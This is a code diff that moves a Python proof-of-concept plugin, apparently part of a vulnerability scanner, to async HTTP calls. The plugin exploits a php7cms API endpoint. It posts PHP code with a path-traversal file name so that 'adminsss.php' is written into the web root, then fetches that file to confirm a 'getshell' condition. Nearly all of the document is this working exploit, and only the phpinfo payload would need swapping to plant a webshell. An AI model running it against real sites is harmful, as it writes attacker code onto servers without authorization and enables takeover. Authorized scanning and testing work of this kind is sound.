@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
+from lib.utils.connect import ClientSession
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -15,8 +16,8 @@ class POC(Script):
         self.refer = 'https://paper.tuisec.win/detail/2139f76293bdb43'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
@@ -24,17 +25,20 @@ class POC(Script):
                 self.url_normpath(self.url, 'php7cms/'),
                 self.url_normpath(self.url, '../php7cms/'),
             ]))
-            for path in path_list:
-                postData = {
-                    'data': '<?php phpinfo()?>'
-                }
-                url1 =  path + 'index.php?s=api&c=api&m=save_form_data&name=/../../../adminsss.php"'
-                res = self.curl('post', url1, data=postData)
-                if res !=None :
-                    url2 = self.base_url + path + 'adminsss.php'
-                    res = self.curl('get', url2)
-                    if res !=None and  "php.ini" in res.text:
-                        self.flag = 1
-                        self.req.append({"url": url2})
-                        self.res.append({"info": url1, "key": "php7cms getshell"})
-                        break
+            async with ClientSession() as session:
+                for path in path_list:
+                    postData = {
+                        'data': '<?php phpinfo()?>'
+                    }
+                    url1 = path + 'index.php?s=api&c=api&m=save_form_data&name=/../../../adminsss.php"'
+                    async with session.post(url=url1, data=postData) as res1:
+                        if res1 != None:
+                            url2 = path + 'adminsss.php'
+                            async with session.get(url=url2) as res2:
+                                if res2 !=None:
+                                    text = await res2.text()
+                                    if "php.ini" in text:
+                                        self.flag = 1
+                                        self.req.append({"url": url2})
+                                        self.res.append({"info": url1, "key": "php7cms getshell"})
+                                        break
